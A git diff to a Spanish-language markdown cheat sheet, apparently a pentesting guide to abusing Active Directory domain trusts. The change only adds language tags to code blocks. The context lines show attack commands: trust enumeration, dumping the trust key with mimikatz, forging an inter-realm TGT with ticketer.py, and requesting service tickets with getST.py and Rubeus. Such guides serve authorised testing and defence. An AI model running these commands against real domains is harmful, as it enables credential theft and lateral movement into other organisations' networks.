@@ -29,7 +29,7 @@ tags:
 
 ## 1. Enumerar las confianzas
 
-```
+```powershell
 # PowerView
 Get-DomainTrust
 Get-ForestTrust
@@ -46,7 +46,7 @@ nxc ldap dc -u user -p pass -M enum_trusts
 
 Sacar el SID de cada dominio —hace falta para el SID History y la forja inter-reino:
 
-```
+```powershell
 Get-DomainSID -Domain raiz.local
 lookupsid.py dominio.local/user:pass@dc 0
 ```
@@ -89,7 +89,7 @@ lsadump::trust /patch          # mimikatz, en el DC
 
 Forjar el TGT de referencia inter-reino con esa clave:
 
-```
+```sh
 ticketer.py -nthash HASH_CONFIANZA -domain-sid SID_ORIGEN -domain origen.local \
   -spn krbtgt/destino.local usuario
 # usar contra el destino
@@ -98,7 +98,7 @@ getST.py -k -no-pass -spn CIFS/servidor.destino.local destino.local/usuario
 
 Rubeus, desde Windows:
 
-```
+```sh
 Rubeus.exe asktgs /ticket:trust.kirbi /service:CIFS/servidor.destino.local /dc:dc.destino.local /ptt
 ```
 
